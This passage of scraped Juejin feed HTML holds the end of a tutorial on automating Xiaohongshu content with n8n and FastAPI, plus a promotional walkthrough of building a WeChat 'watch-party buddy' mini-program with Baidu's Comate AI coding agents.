<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9ddf731a0fa42a5b9c731fdc364980f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=3owJxjbpJSXfKL94TDES3S9zh9c%3D" alt="" loading="lazy"/></p>
<p>接着把所有操作，让AI写Playwright脚本，一比一还原出来</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ccce0b7cddb4bfc9f00b78b7d8748dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=M5s2SDlAr6MfwikezJqQ7i1of68%3D" alt="" loading="lazy"/></p>
<p>最后，再把它封装成FastAPI，函数大概长这样，如果不懂的话，没关系，把我教程跟AI说，让它自己做就好了</p>
<p>同时我也会在文末分享出来源文档，让AI改改就能用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d459118c0cf649c6afbe69f5d56730d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=TTkekxfLgGhjORxZIy1fqiCqzm8%3D" alt="" loading="lazy"/></p>
<p>其中，我把图片存到了七牛云的图床，这样方便我后续上传到飞书、以及远程小伙伴发布笔记的时候也可以直接读取</p>
<p>用FastAPI的好处就是会自动生成一个接口文档，如图，我是部署在了服务器的9394端口的/memo</p>
<p>也能看出来我需要传参标题与正文</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/690ee5ed555240e289e4e1a919585342~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=5iWGS2RBpAaXLN5GLr5S3nIEbLo%3D" alt="" loading="lazy"/></p>
<p>对应到n8n就是http请求</p>







<table><thead><tr><th><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4832f460fa7e4918817cdf45ad1d18e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=MKjqgsdaJPjouEzKhOTDCR%2BJ%2FiA%3D" alt="" loading="lazy"/></th><th><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/522a0eb65c204097b3d353f2e514f354~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=SZvN7QzJaF4N%2B%2Fy41dlnM%2B8rGUQ%3D" alt="" loading="lazy"/></th></tr></thead></table>
<p>这个n8n+FastAPI的打法无敌了，基本上可以把近乎所有的流程都自动化</p>
<p>如果你还没试过，就一定要跑一下我的项目，感受一下它的威力</p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4. <strong>笔记内容和图片上传飞书</strong></p>
<p>这一步在于适配飞书的接口，没有技术难度，就是测；</p>
<p>要是你刚好也要做这个功能，直接用我的模板，能省下来不少时间。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0b99db9936841fa9479bbe5c0a08d39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=Q7%2FZz5yZkBrv2lhITSwlSjzg%2FLI%3D" alt="" loading="lazy"/></p>
<p>首先把前面生成的多张小红书图片，逐个上传到飞书获取到file_token</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17d6e9eaa2114b9cab3e67715bcbedb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=o1qe9rAkHGp7Qsk5pohloa2RjWk%3D" alt="" loading="lazy"/></p>
<p>然后通过Code把file_token改装成{"file_token":xxx}的形式，重新放到一个数组里</p>






<table><thead><tr><th>SQL result= [] for item in _input.all(): result.append({"file_token":item.json.data.file_token})  return result</th></tr></thead></table>
<p>再把这个数组定义为file_token</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fc49b72af7443908ad3330ff146a460~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=L%2BWGbxmzAoFNM3Zqd1gDohw0maY%3D" alt="" loading="lazy"/></p>
<p>最后就可以直接上传到飞书了，整体比较绕，可以参考一下飞书的接口文档。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/751320f6aee24704ac0413246fc8e854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=RcaEf0Y9kljTbknsMcFJhAW%2B%2BFw%3D" alt="" loading="lazy"/></p>
<p>效果是这样的：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/099574dab09841b9911ad341048b12d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=eaqdKV5kYxyTpt7TDbJ4kT%2Bc0UU%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><strong>写在最后</strong></p>
<p>我梳理了一个示意图，希望你帮你更清楚的理解这个流程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5b3cc74507b48a4b7361354ea96236e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=ElYGqMzYvgfEBcAMNsBaLEcFXV4%3D" alt="" loading="lazy"/></p>
<p>现在再回头看开头那句话，或许你更能理解我为什么说 n8n + AI编程是小团队的自动化神器。</p>
<p>这套打法彻底改变了我做内容矩阵的模式。</p>
<p>整个流程的核心，并非某个复杂的代码或提示词，而是这套将想法快速落地的自动化思路。</p>
<p>当你也跑通第一个自动化流程，亲眼看着内容、图片、数据在不同平台间丝滑流转时，相信你也会和我一样，体验到那种自己革了自己的命、效率翻倍的爽快感。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全运会，用文心快码做个微信小程序帮我找「观赛搭子」]]></title>    <link>https://juejin.cn/post/7574727105704493096</link>    <guid>https://juejin.cn/post/7574727105704493096</guid>    <pubDate>2025-11-21T03:44:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574727105704493096" data-draft-id="7574671792998105123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全运会，用文心快码做个微信小程序帮我找「观赛搭子」"/> <meta itemprop="keywords" content="前端,微信小程序,人工智能"/> <meta itemprop="datePublished" content="2025-11-21T03:44:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="文心快码BaiduComate"/> <meta itemprop="url" content="https://juejin.cn/user/992209294070809"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全运会，用文心快码做个微信小程序帮我找「观赛搭子」
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/992209294070809/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    文心快码BaiduComate
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:44:43.000Z" title="Fri Nov 21 2025 03:44:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>四年一度的全运会又到了！</p>
<p>作为一个死宅+社恐属性拉满的羽球人🏸</p>
<p>想去现场看一场比赛，却找不到人一起同行😩</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38cbf4468f3046bbb06bf90ba1e2d0ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=Vp%2F9owjubZTTWk4sNTVutkGu9AQ%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>能否用<strong>文心快码Comate</strong></p>
<p><strong>不写代码，不画设计图</strong></p>
<p><strong>一小时</strong>开发一个找“观赛搭子”的微信小程序？🤔</p>
<p>理论可行，实践开始！</p>
<h2 data-id="heading-0">Step1 从模糊想法到完整架构</h2>
<p>动手前，先找出我们的“产品经理”——<strong>Plan智能体，</strong> 让它帮我把整个项目的架构想清楚。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7df23a715e6e48b88b31e33c72e3b7e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=anbg9VOBzl1yKUoCs8s%2BZSExqZE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>点击对话窗口左下角，即可切换不同子智能体⬆️</p>
<p>然后，用自然语言给出你的需求。</p>
<blockquote>
<p>全运会快到了，我想做一个小程序，可以线上约人一起看比赛。先搞个最基础的版本，后面再慢慢加功能。</p>
</blockquote>
<p>几秒钟后，Plan智能体就为我生成了一份<strong>完整的架构设计文档</strong>。这份文档清晰地规划了：</p>
<ul>
<li>数据模型：用户表、邀约表、参与者表、比赛信息表</li>
<li>交互设计：卡片布局、社交化头像展示、状态标签系统</li>
<li>开发规范：组件化、响应式、性能优化等约束</li>
</ul>

<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 观赛搭子 - 微信小程序</span>

<span class="hljs-section">## 项目概述</span>
使用微信小程序原生框架 (WXML, WXSS, JS) 搭建一个"观赛搭子"功能。

<span class="hljs-section">## 第一部分：后端数据表设计 (Mock)</span>

请先定义三个核心的 Mock 数据表结构：

<span class="hljs-section">### User (用户表)</span>
<span class="hljs-bullet">-</span> userId (ID)
<span class="hljs-bullet">-</span> nickname (昵称)
<span class="hljs-bullet">-</span> avatarUrl (头像)
<span class="hljs-bullet">-</span> gender (性别)

<span class="hljs-section">### SpectatorPost (观赛邀约表)</span>
<span class="hljs-bullet">-</span> postId (帖子ID)
<span class="hljs-bullet">-</span> hostUserId (发起人ID, 关联 User)
<span class="hljs-bullet">-</span> matchName (比赛场次)
<span class="hljs-bullet">-</span> eventTime (时间)
<span class="hljs-bullet">-</span> location (地点)
<span class="hljs-bullet">-</span> maxParticipants (邀约人数)
<span class="hljs-bullet">-</span> description (备注)

<span class="hljs-section">### PostParticipants (参与者表)</span>
<span class="hljs-bullet">-</span> postId (关联 SpectatorPost)
<span class="hljs-bullet">-</span> userId (关联 User)

<span class="hljs-section">## 第二部分：前端页面 - 邀约广场 (列表页)</span>

创建一个页面，用于展示所有"观赛邀约"卡片列表。页面标题为"邀约广场"。

<span class="hljs-section">### 卡片结构</span>

<span class="hljs-section">#### 头部</span>
<span class="hljs-bullet">-</span> 显示 matchName (比赛场次)
<span class="hljs-bullet">-</span> 显示 eventTime (时间)
<span class="hljs-bullet">-</span> 显示 location (地点)

<span class="hljs-section">#### 中部 (社交)</span>
<span class="hljs-bullet">-</span> 左侧显示发起人的 avatarUrl (大头像) 和 nickname (昵称)，并有"发起人"标签
<span class="hljs-bullet">-</span> 右侧水平排列已加入成员的 avatarUrl (小头像列表, mock 2-3个)

<span class="hljs-section">#### 尾部</span>
<span class="hljs-bullet">-</span> 显示人数状态，格式为 "已召集 X / Y 人" (Y = maxParticipants, X = PostParticipants 里的数量)
<span class="hljs-bullet">-</span> 右侧有一个"立即加入"按钮

<span class="hljs-section">### 样式要求</span>
使用 WXSS 设计卡片布局，突出社交属性（头像）。

<span class="hljs-section">## 第三部分：前端页面 - 发布新邀约 (表单页)</span>

创建一个页面，用于发布新的"观赛邀约"。

<span class="hljs-section">### 表单项</span>
<span class="hljs-bullet">-</span> 比赛场次：(input type="text")
<span class="hljs-bullet">-</span> 比赛日期：(picker mode="date")
<span class="hljs-bullet">-</span> 比赛时间：(picker mode="time")
<span class="hljs-bullet">-</span> 观赛地点：(input type="text")
<span class="hljs-bullet">-</span> 邀约人数：(input type="number")
<span class="hljs-bullet">-</span> 备注信息：(textarea)

<span class="hljs-section">### 按钮</span>
底部有一个"立即发布"按钮。

<span class="hljs-section">### 样式要求</span>
使用 WXSS 提供简洁、对齐的布局。
</code></pre>
<p>如果按传统流程，一个产品经理+架构师团队至少需要1天才能输出这样的文档，而Comate在<strong>几秒钟内</strong>就完成了🤩</p>
<h2 data-id="heading-1">Step2：一键托管开发流程</h2>
<p>有了完整的架构文档，切换“全能打工人”<strong>Zulu智能体</strong>，让它帮我自动开发即可，双手离开键盘😎</p>
<p>⌛️等待期间，能实时看到Zulu的工作进度，有种牛马cos老板的快感：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c42ac63fb8ec4e538277a7477a21d77e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=rga5Tn5JDgCiwgmLqRQZeFgKL7s%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>从创建项目配置文件，到搭建页面结构，再到实现交互逻辑，Zulu“大包大揽”，一个字母都不用你亲自输入。</p>
<p>整个过程行云流水，<strong>不到2分钟，一个完整的微信小程序代码就已经生成完毕。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99c590b5f599433b83f30d193b9d01b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=VRuwYxP91OoMxiWutKEy1JZjbm8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>过程中，遇到任何问题都可以询问<strong>Ask智能体</strong>，它不仅能解答程序上下文范围内的问题，还能联网搜索，解答程序外的问题：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50f16acc05fe46f99f14640e43192eda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=gPpDfF51UWDmkKYG6i8ncnNU3rA%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>第一次使用小程序开发者工具的我，在Comate保姆级服务下，跑通了我人生中第一个小程序：</p>
<p>视频展示👉<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F13bTShqoRcSp25UmYbxSow" target="_blank" title="https://mp.weixin.qq.com/s/13bTShqoRcSp25UmYbxSow" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/13bTShqoR…</a></p>
<p>从一个模糊的想法，到一个可交互的小程序，总共用时不到<strong>10分钟</strong>。</p>
<h2 data-id="heading-2">Step3：用自然语言驱动产品优化</h2>
<p>在体验了基础版本后，我发现了一些体验上的不足。于是我<strong>直接用自然语言</strong>向Zulu提出了5个优化需求：</p>
<blockquote>
<p>第一次打开小程序时，需要用户授权登录微信信息</p>
<p>点击头像，需要能看到用户的个人信息</p>
<p>新增的邀约应当放在邀约广场最上方</p>
<p>对于同一个邀约，一个人只能加入一次</p>
<p>加入邀约后可以随时取消</p>
</blockquote>
<p>Zulu智能体再次制定了优化计划，并开始逐项实现：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/623e92f9ebc648dab53acc96e1fa11d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=uyAoiYoaz6AD2TDW9EX2kuWfnK0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>这一轮迭代，Comate又用了<strong>不到5分钟</strong>。这种迭代速度在传统开发模式下是不可想象的。</p>
<p>❗️过程中，如需debug，可以这样保持姿态优雅：</p>
<p>1️⃣把出错的网页截屏给Zulu</p>
<p>2️⃣command + Y，把终端信息直接添加到Zulu的上下文</p>
<p>3️⃣勾选“自动执行”，让Zulu实现测试—debug的闭环</p>
<p>任选一种，即可享受超丝滑开发体验！</p>
<h2 data-id="heading-3">Step4：从开发到发布，实现保姆级闭环服务</h2>
<p>当我完成所有开发和测试后，我问了AI最后一个问题：</p>
<blockquote>
<p>我做好了，现在想要发布这个小程序，怎么办？</p>
</blockquote>
<p>Ask智能体为我生成了一份详尽的小程序发布指南，从发布前准备、代码上传、提交审核、注意事项到最终发布上线，每个步骤都讲解得清清楚楚。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d384c61f69245f8851190bfe38cd2b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=wVfIzCHT3DiVMUSUYiMssuKHsEw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>这份指南的专业程度，让我这个小程序开发新手也能顺利完成发布流程。</p>
<p>✨最后，让我们一起验收下，这个<strong>0代码、0设计稿、1小时内</strong>开发出的小程序，究竟效果怎么样：</p>
<p>视频展示👉<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F13bTShqoRcSp25UmYbxSow" target="_blank" title="https://mp.weixin.qq.com/s/13bTShqoRcSp25UmYbxSow" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/13bTShqoR…</a></p>
<p>最后，让我用几个数字来总结这次开发体验：</p>
<p>⏱️ 总耗时：约1小时（传统开发需要1-2周）</p>
<p>📝 生成代码量：1500+行完整可用代码</p>
<p>🎯 需求响应速度：自然语言提出需求 → 5分钟内实现</p>
<p>🔄 迭代次数：2次大迭代，零返工</p>
<p>💰 开发成本：接近于零（无需组建团队）</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c62b87f2ca94ba0b497e10dae01fb0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764301483&amp;x-signature=hIdtr5GC3akvgOeMD6bpZXloE4k%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>这个一小时开发的小程序，已经具备继续演进的基础：</p>
<p>短期可以接入真实API、增加即时通讯、实现地理推荐；</p>
<p>长期能探索智能匹配、社交裂变、商业变现。</p>
<p>从想法到产品，文心快码正让开发变得触手可及😍</p>
<p><strong>👇 别光心动，现在就上手开造！</strong></p>
<p>一键下载 Comate，把你的脑洞变成现实</p>
<p>方式一：下载Comate AI IDE，享受丝滑开发过程 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcomate.baidu.com%2Fzh%2Fdownload%25EF%25BB%25BF" target="_blank" title="https://comate.baidu.com/zh/download%EF%BB%BF" ref="nofollow noopener noreferrer">comate.baidu.com/zh/download…</a></p>
<p>方式二：在 VS Code 或 Jetbrains IDE 中搜索“文心快码”插件，安装即用</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker Compose 数据卷挂载详解与项目实战]]></title>    <link>https://juejin.cn/post/7574734686493884452</link>    <guid>https://juejin.cn/post/7574734686493884452</guid>    <pubDate>2025-11-21T03:50:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574734686493884452" data-draft-id="7574813550754627620" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker Compose 数据卷挂载详解与项目实战"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-21T03:50:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker Compose 数据卷挂载详解与项目实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
